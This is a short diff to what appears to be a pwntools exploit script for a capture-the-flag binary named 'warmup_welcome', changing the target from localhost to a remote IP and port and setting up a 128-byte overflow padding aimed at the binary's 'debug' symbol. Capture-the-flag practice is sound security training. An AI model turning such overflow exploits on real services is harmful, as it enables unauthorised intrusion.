@@ -2,7 +2,7 @@ from pwn import *
 
 def exploit():
 	binary = ELF("./warmup_welcome")
-	r = remote("127.0.0.1", 8888)
+	r = remote("180.250.7.183", 52557)
 	r.sendlineafter("Team : ", "NAYEON")
 	debug = binary.symbols["debug"]
 	first_pad = 128 #Gotten by doing dynamic analyzing on gdb and fuzzing so hard
